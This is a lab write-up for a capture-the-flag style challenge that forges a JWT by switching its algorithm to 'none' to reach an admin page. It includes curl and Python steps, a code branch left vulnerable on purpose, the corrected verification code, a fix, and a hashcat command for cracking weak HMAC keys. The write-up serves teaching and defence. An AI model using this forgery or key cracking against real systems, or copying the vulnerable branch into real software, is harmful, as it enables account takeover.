# 01 Session Forge: JWT forgery via an unsigned token

**Target:** `https://northwind-01-session-forge.vercel.app`
**Class:** broken authentication, CWE-347
**Solution:** `apps/solve/solve-01.sh`

This write-up lives beside the code it describes. Every snippet below is the
running implementation, and every command was executed against the deployment
named above.

---

## Statement

Sign in with `wiener` / `peter`. That account authenticates successfully and is
refused by the administration page. Reach that page without the
administrator's password.

---

## How it is solved, step by step

### Step 1. Sign in and capture the session cookie

```bash
BASE=https://northwind-01-session-forge.vercel.app
curl -s -c jar.txt -o /dev/null -X POST \
  -d 'username=wiener&password=peter' "$BASE/login"
```

The response is a `302` whose `Set-Cookie` header carries the token:

```
set-cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJub3J0a…
            Path=/; HttpOnly; SameSite=Lax; Secure
```

Two properties are worth noticing. `HttpOnly` means JavaScript cannot read it,
which matters in application 03. `Secure` means it will not be sent over plain
HTTP.

### Step 2. Confirm the boundary actually works

```bash
curl -s -b jar.txt -o /dev/null -w 'HTTP %{http_code}\n' "$BASE/admin"
# HTTP 403
```

This step is the one people skip, and it is the reason the demonstration is
worth anything. It proves the 403 in step 4 is caused by the forgery rather
than by a broken login.

### Step 3. Decode the genuine token

```bash
python3 - <<'PY'
import base64, json, sys
token = open('jar.txt').read().split('session')[1].split()[0]
for name, part in (('header', 0), ('payload', 1)):
    raw = base64.urlsafe_b64decode(token.split('.')[part] + '==')
    print(name, json.loads(raw))
PY
```

```
header  {"alg": "HS256", "typ": "JWT"}
payload {"iss": "northwind.supply", "iat": …, "exp": …, "sub": "wiener",
         "name": "Wiener Vogel"}
```

Anyone can read this. base64url is an encoding, not encryption.

### Step 4. Forge the token

```bash
FORGED=$(python3 apps/solve/forge.py --alg none --sub administrator \
         --original "$TOKEN" | tail -1)
```

which produces:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJub3J0aHdpbmQuc3VwcGx5Iiwi…
  └ header: {"alg":"none","typ":"JWT"} ┘  └ payload: …"sub":"administrator" ┘  └ empty ┘
```

Three edits, no cryptography:

1. `alg` becomes `none`
2. `sub` becomes `administrator`
3. the signature becomes empty, keeping the trailing dot because the parser
   splits on it

### Step 5. Replay it

```bash
curl -s -H "Cookie: session=$FORGED" "$BASE/admin" | grep -oE 'G24\{[^}]+\}'
# G24{N0t_4_Cl4im_V3r1f13d}
```

---

## Why it works

`apps/01-session-forge/lib/store.js`:

```js
// VULNERABLE (application 01). Verification is dispatched on the algorithm the
// token itself names, so an attacker edits the header to select a branch that
// returns the payload with no signature checked at all.
if (header.alg === 'none') {
  const unsignedExpiry = Math.floor(Date.now() / 1000);
  if (typeof payload.exp === 'number' && payload.exp < unsignedExpiry) return null;
  return { ...payload, _verified: false };
}

if (header.alg !== 'HS256') return null;
```

`alg` is **inside the token**, which means it is attacker-controlled. The
attacker does not forge a signature. They choose a branch in which no
signature is required.

The comparison that consumes the result, in `app/admin/route.js`:

```js
if (claims.sub !== 'administrator') {
  return refuse(`This area is for administrators. The session you are holding
                 belongs to "${claims.sub}".`);
}
```

That single comparison is the whole authorisation boundary of this
application. It is correct. It is simply reading a value that was never
verified.

The correct implementation, in `apps/_shared/store.js`:

```js
if (header.alg !== 'HS256') return null;   // server picks, not the token

const expected = createHmac(HMAC_ALGORITHM, signingSecret())
  .update(`${encodedHeader}.${encodedPayload}`)
  .digest();
const provided = Buffer.from(encodedSignature, 'base64url');
if (expected.length !== provided.length || !timingSafeEqual(expected, provided)) {
  return null;
}
```

---

## The fix

Delete the `alg === 'none'` branch and keep the pinned check. Better, configure
the algorithm allow-list in the signing library so the choice cannot be
forgotten in application code.

---

## Unintended paths, and why they are closed

| Path | Result | Reason |
|---|---|---|
| `alg: None`, `NONE`, `nOnE` | rejected | case variants would be a second instance of the same defect |
| payload altered, signature kept | rejected | the HMAC covers the payload |
| expired token | rejected | the `none` branch enforces `exp` too |
| malformed base64url, non-JSON | rejected | rejected while parsing |

---

## Related classes

- **Algorithm confusion** (RS256 to HS256) is the same mistake with a different
  payload. The fix is identical: the server chooses the algorithm.
- **Weak HMAC secret.** `hashcat -a 0 -m 16500 <jwt> <wordlist>` cracks a weak
  key entirely offline, with no requests to the server. This application does
  not use a weak key, because that would be a second defect.

---

## Verify it yourself

```bash
BASE=https://northwind-01-session-forge.vercel.app bash apps/solve/solve-01.sh
```

Or apply the fix to a scratch copy and watch the same attack fail.